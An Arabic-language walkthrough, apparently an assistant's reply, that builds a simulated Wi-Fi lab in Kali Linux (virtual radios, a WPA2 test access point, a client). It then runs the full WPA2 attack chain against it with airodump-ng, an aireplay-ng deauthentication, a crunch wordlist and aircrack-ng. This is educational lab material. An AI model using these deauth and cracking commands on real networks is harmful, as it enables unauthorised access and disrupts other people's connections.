تمام 👌 خلينا نشتغلها بالخطوات كأننا بنصنع **أدابتور افتراضي** ونعمل شبكة كاملة ونجرّب عليها. وده كله جوّه كالي من غير ما تشتري USB Wi-Fi.

---

# 🔹 1) إنشاء أدابتور افتراضي (mac80211\_hwsim)

الموديول `mac80211_hwsim` بيعمل كروت Wi-Fi افتراضية:

```bash
sudo modprobe -r mac80211_hwsim || true
sudo modprobe mac80211_hwsim radios=3
```

ده هيعمل 3 واجهات:

* `wlan0` → هنخليها **Access Point**.
* `wlan1` → هنخليها **Client**.
* `wlan2` → هنخليها **Monitor Adapter** (كأنك عندك أدابتور حقيقي).

شوفهم:

```bash
iw dev
```

---

# 🔹 2) إنشاء شبكة Wi-Fi (Access Point)

نعمل ملف إعداد للـ AP:

```bash
cat > /tmp/ap.conf <<EOF
interface=wlan0
driver=nl80211
ssid=TestLab
hw_mode=g
channel=6
wpa=2
wpa_passphrase=12345678
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF
```

نشغّل الشبكة:

```bash
sudo hostapd /tmp/ap.conf
```

> هيظهرلك شبكة اسمها **TestLab** وباسوردها **12345678**.

---

# 🔹 3) توصيل عميل بالشبكة

في ترمينال جديد:

```bash
wpa_passphrase TestLab 12345678 | sudo tee /tmp/wpa.conf >/dev/null
sudo wpa_supplicant -i wlan1 -c /tmp/wpa.conf -B
sudo dhclient wlan1
```

دلوقتي الـ `wlan1` متصل بالـ `TestLab`.

---

# 🔹 4) تشغيل أدابتور الـ Monitor

نوقف الخدمات ونفعّل الـ monitor mode:

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan2
```

دلوقتي عندك `wlan2mon` = أدابتورك الافتراضي.

---

# 🔹 5) تجرب التجسس/الاختبار على الشبكة

## مسح الشبكات:

```bash
sudo airodump-ng wlan2mon
```

هتلاقي شبكة **TestLab** والعميل المتصل.

## حفظ الكابتشر من الشبكة:

```bash
sudo airodump-ng --bssid <BSSID_AP> -c 6 -w capture wlan2mon
```

## عمل deauth عشان تلتقط Handshake:

```bash
sudo aireplay-ng --deauth 5 -a <BSSID_AP> -c <ClientMAC> wlan2mon
```

بعدها لما العميل يعيد الاتصال → هيتسجل الـ Handshake في `capture.cap`.

---

# 🔹 6) كسر كلمة المرور (تجربة تعليمية)

توليد wordlist بسيط:

```bash
crunch 8 8 12345678 -o wordlist.txt
```

تشغيل aircrack:

```bash
aircrack-ng -w wordlist.txt -b <BSSID_AP> capture.cap
```

---

✅ كده إنت عملت:

1. **أدابتور افتراضي**.
2. **شبكة تجريبية**.
3. **اتصال عميل**.
4. **أدابتور monitor**.
5. **تجربة كاملة (scan → capture → deauth → crack)**.

---

تحب أكتبلك الأوامر دي كلها في **سكريبت واحد جاهز** بحيث تشغّله خطوة بخطوة بدل ما تنفذ كل أمر بإيدك؟
==
